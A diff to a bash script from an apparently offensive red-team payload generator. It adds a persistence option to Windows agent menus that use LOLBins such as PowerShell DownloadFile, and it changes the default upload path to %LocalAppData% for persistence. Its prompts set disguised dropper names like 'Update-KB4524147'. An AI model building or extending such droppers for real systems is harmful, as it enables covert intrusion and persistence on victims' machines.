@@ -11950,7 +11950,8 @@ cat << !
     | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
     | LOLBin             : WinHttpRequest
     | DROPPER EXTENSION  : PS1
-    |_AGENT EXTENSION    : PS1
+    | AGENT EXTENSION    : PS1
+    |_AGENT PERSISTENCE  : NOT AVAILABLE
 
     AGENT Nº2
     ╔──────────────────────────────────────────────────────────────
@@ -11958,7 +11959,8 @@ cat << !
     | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
     | LOLBin             : Powershell (DownloadFile)
     | DROPPER EXTENSION  : BAT
-    |_AGENT EXTENSION    : PS1
+    | AGENT EXTENSION    : PS1
+    |_AGENT PERSISTENCE  : AVAILABLE
 
     AGENT Nº3
     ╔──────────────────────────────────────────────────────────────
@@ -11966,7 +11968,9 @@ cat << !
     | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
     | LOLBin             : Powershell (DownloadFile)
     | DROPPER EXTENSION  : .{RANDOM}.BAT (MITRE T1036)
-    |_AGENT EXTENSION    : PS1
+    | AGENT EXTENSION    : PS1
+    |_AGENT PERSISTENCE  : AVAILABLE
+
 
     ╔─────────────────────────────────────────────────────────────╗
     ║   M    - Return to main menu                                ║
@@ -12174,15 +12178,15 @@ lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --wid
 Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-KB4524147\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-Update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 CN=$(zenity --title="☠ Enter OpenSSL CN (domain name) ☠" --text "example: SSARedTeam.com" --entry --width 300) > /dev/null 2>&1
-rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %userprofile%\\\\\\\Desktop" --entry --width 350) > /dev/null 2>&1
+rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %ProgramFiles%\nexample: %LocalAppData% (*)\nexample: %userprofile%\\\\\\\Desktop\n\n(*) Recomended Path For Persistence Module." --entry --width 350) > /dev/null 2>&1
 
 
 ## setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="443";fi
-if [ -z "$rpath" ]; then rpath="%tmp%";fi
 if [ -z "$CN" ]; then CN="SSARedTeam.com";fi
 if [ -z "$NaM" ]; then NaM="Security-Update";fi
+if [ -z "$rpath" ]; then rpath="%LocalAppData%";fi
 if [ -z "$Drop" ]; then Drop="Update-KB4524147";fi
 
 
